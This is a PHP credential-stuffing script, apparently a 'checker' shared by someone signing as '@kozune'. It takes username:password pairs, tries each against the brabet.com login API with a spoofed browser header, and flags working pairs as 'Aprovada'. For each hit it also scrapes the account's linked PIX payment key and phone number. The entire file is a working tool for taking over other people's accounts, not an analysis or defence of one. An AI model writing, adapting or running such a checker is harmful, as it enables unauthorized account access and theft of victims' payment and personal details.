<?php
set_time_limit(0);
function getStr($string, $start, $end)
    {
      $str = explode($start, $string);
      $str = explode($end, $str[1]);
      return $str[0];
    }

    function multiexplode($delimiters, $string) {
      $one = str_replace($delimiters, $delimiters[0], $string);
      $two = explode($delimiters[0], $one);
      return $two;
  }
  
  
  $lista = $_GET['lista'];
  $usuario = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[0];
  $senha = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[1];

$linkprincipal = "https://api.brabet.com/login/login";

$headers = array();
$header_brabet = array(
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
);

$result = curl_init();
curl_setopt($result, CURLOPT_URL, $linkprincipal);
curl_setopt($result, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($result, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($result, CURLOPT_POSTFIELDS, "account=$usuario&password=$senha&area=55&login_type=2&mainVer=1&subVer=1&pkgName=h5_client&nativeVer=0&deviceid=PC_096b1fb7-ebb4-496a-b194-9c181c60b9d9&Type=101&os=Windows&ioswebclip=0&isShell=0&language=en-us");
curl_setopt($result, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($result, CURLOPT_HTTPHEADER, $header_brabet);

echo $result = curl_exec($result);

$tel = GetStr($result,'tel":"','"');
$chavepix = GetStr($result,'pix_key":"','"');
$tipopix = GetStr($result,'pix_type":"','"');

$infos = "pix vinculado: $tipopix:$chavepix telefone vinculado:$tel";


if(strpos($result,'success')){
      echo "<span class='badge badge-success' style='color:white'>#Aprovada </span> ➔ </span><span class='badge badge-primary' style='color:white'> ".$usuario.":".$senha." </span> <span class='badge badge-danger' style='color:white'> logado com sucesso </span> ➜ <span class='badge badge-success' style='color:white'>informaçoes: $infos </span>➜ <span class='badge badge-success' style='color:white'>by: @kozune </span></h5><br>";
  }elseif(strpos($result,'Wrong password')){
      echo "<span class='badge badge-danger' style='color:white'>✖️ Reprovada  </span> ➔ </span><span class='badge badge-primary' style='color:white'> ".$usuario.":".$senha." </span> ➔ </span> <span class='badge badge-danger' style='color:white'> senha errada </span>➜ <span class='badge badge-info' style='color:white'>Tempo:  </span> ➜ <span class='badge badge-success' style='color:white'>by: @kozune </span></h5><br>";
    }elseif(strpos($result,'The account does not exist')){
        echo "<span class='badge badge-danger' style='color:white'>✖️ Reprovada  </span> ➔ </span><span class='badge badge-primary' style='color:white'>  ".$usuario.":".$senha." </span> ➔ </span> <span class='badge badge-danger' style='color:white'> conta com o email nao existe </span>➜ <span class='badge badge-info' style='color:white'>Tempo:  </span> ➜ <span class='badge badge-success' style='color:white'>by: @kozune </span></h5><br>";
      }
  
?>